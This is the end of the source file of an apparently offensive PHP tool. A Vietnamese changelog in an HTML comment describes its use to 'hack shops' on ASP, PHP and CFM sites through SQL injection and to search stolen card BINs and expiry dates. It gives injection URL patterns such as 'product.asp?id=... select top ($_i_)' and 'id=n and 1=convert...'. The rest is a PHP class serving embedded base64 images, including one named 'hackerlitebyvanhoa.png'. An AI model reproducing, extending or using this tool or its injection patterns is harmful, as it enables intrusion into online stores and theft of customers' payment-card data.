		*27/04/2008 - 1.00 : Viết lại toàn bộ; thêm chức năng Search bin, expdate; thêm các kiểu query. </br>
		*23/04/2008 - Open beta 1b : Sửa một số lỗi đối với shop asp - thanks anh kid. </br>
		*22/04/2008 - Open beta 1 : Sửa một số lỗi đối với shop asp, thêm chức năng tự động query địa chỉ do bạn nhập vào (VD: bạn muốn vào http://site.com/product.asp?id=... select top 1 ..., http://site.com/product.asp?id=... select top 2 ...,  ... http://site.com/product.asp?id=... select top 100 ...  để lấy cái gì đó nằm ở giữa tiền tố <b>value '</b> và <b>' to</b>... thì chỉ cần nhập vào địa chỉ là http://site.com/product.asp?id=... select top ($_i_) ...)</br>
		*20/8/2008 - alpha 4: thêm chức năng hack shop asp. sắp xếp thứ tự các column. bạn có thể bỏ đi bước get table và column nếu bạn đã biết table và column cần lấy thông tin. Shop php giờ có thể chọn nhiều table. Biến chạy có thể chạy từ lớn về nhỏ (VD bạn nhập bắt đầu là 1000 và kết thúc là 0).</br>
		*18/08/2008 - aplha 3: sửa lỗi một số shop php không query được. cho phép bạn chọn kiểu query khi hack shop cfm: domain.com/dir/product.cfm?id=convert... và domain.com/dir/product.cfm?id=n and 1=convert...</br>
		*14/04/2008 - alpha 2: thêm cfm</br>
		*13/04/2008 - Alpha: initial released.</br>-->
	</font>
	</body>
</html>

<?php
		class ezimg {
		 function genImageTag($name){$image = ezimg::getImgData($name);$result = "<img src='?simg={$name}' alt='' width='{$image['width']}' height='{$image['height']}' />";return $result;}
		 function showImg($name){$image = ezimg::getImgData($name);header("Content-type: image/{$image['type']}");echo gzuncompress(base64_decode(str_replace(Array(' ','	'), Array('',''), $image['code'])));exit;}
		 function getImgData($name){
		  $images = array(
		   'blank.gif' => array( 
		     'type'=>'gif', width=>'1', height=>'1',
		     'code'=>"eJxz93SzsExkZGBkaGCAAsWfLIwgWgdEgGQYmJhcGBmsAXIBA/w="
		    ),
			  'hackerlitebyvanhoa.png' => array( 
     'type'=>'png', width=>'120', height=>'80',
     'code'=>"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
